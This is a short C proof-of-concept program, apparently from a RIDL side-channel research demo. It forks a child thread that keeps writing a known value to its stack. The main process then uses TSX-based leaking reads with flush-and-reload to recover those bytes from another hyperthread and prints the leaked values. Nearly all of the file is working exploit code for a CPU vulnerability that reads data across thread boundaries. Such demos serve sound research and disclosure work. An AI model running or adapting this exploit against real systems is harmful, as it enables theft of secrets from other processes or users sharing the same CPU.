/*
Leak writes from another thread.

Notes:

Expected output:
$ taskset -c 3,7 ./ridl_basic
00001839: 81 (?)

*/
#define ITERS 10000

#include "ridl.h"

int main(int argc, char *argv[]) {
	pid_t pid = fork();
	if (pid == 0) {
		while (1)
			asm volatile(
				"movq %0, (%%rsp)\n"
				"mfence\n"
				::"r"(0x8887868584838281ull));
	}
	if (pid < 0) return 1;

	ALLOC_BUFFERS();
	(void)leak;

	memset(results, 0, sizeof(results));

	for (size_t i = 0; i < ITERS; ++i) {
		flush(reloadbuffer);
		asm volatile("mfence\n");
		tsx_leak_read_normal(NULL, reloadbuffer);
		reload(reloadbuffer, results);
	}

	print_results(results);
	kill(pid, SIGKILL);
}

